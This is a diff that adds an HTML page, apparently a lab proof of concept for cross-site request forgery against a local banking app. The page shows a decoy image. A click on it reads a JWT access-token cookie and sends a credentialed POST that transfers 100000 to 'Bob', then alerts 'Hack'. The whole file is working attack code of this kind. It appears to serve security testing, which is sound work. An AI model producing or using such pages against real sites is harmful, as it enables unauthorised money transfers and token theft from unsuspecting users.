@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Money Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+<img id="submitButton" src="https://img.freepik.com/free-photo/3d-render-flying-banknotes-with-wings-money-set_107791-15398.jpg?t=st=1730773744~exp=1730777344~hmac=f0fa3d2c73887695d8240e76b3f61384098bec095fefd8f5d2a6f5ba291284cf&w=1380" alt="Một bức ảnh đẹp" width="300" height="200" style="border: 2px solid black;">
+
+<script>
+    const submitButton = document.getElementById('submitButton');
+    submitButton.addEventListener('click', (event) => {
+  //      const csrfToken = document.cookie.replace(/(?:(?:^|.*;\s*)XSRF-TOKEN\s*\=\s*([^;]*).*$)|^.*$/, '$1');
+        const accessToken = document.cookie.replace(/(?:(?:^|.*;\s*)jwt_access_token\s*\=\s*([^;]*).*$)|^.*$/, '$1');
+
+ //       console.log(csrfToken);
+        console.log(accessToken);
+
+        axios.post('http://bank.banklord.localhost:11000/transfer', {
+            receiver: "Bob",
+            amount: 100000
+        },{ headers: {
+                'Content-Type': 'application/json',
+         //       'X-XSRF-TOKEN': csrfToken,
+                //  'Access-Control-Allow-Origin': '*'
+            },withCredentials: true})
+            .then(response => {
+                console.log('Login successful:', response.data);
+                alert("Hack")
+                // Xử lý phản hồi từ server, ví dụ: chuyển hướng
+            })
+            .catch(error => {
+                console.error('Login failed:', error);
+                // Xử lý lỗi, ví dụ: hiển thị thông báo lỗi
+            });
+    });
+</script>
+</body>
+</html>
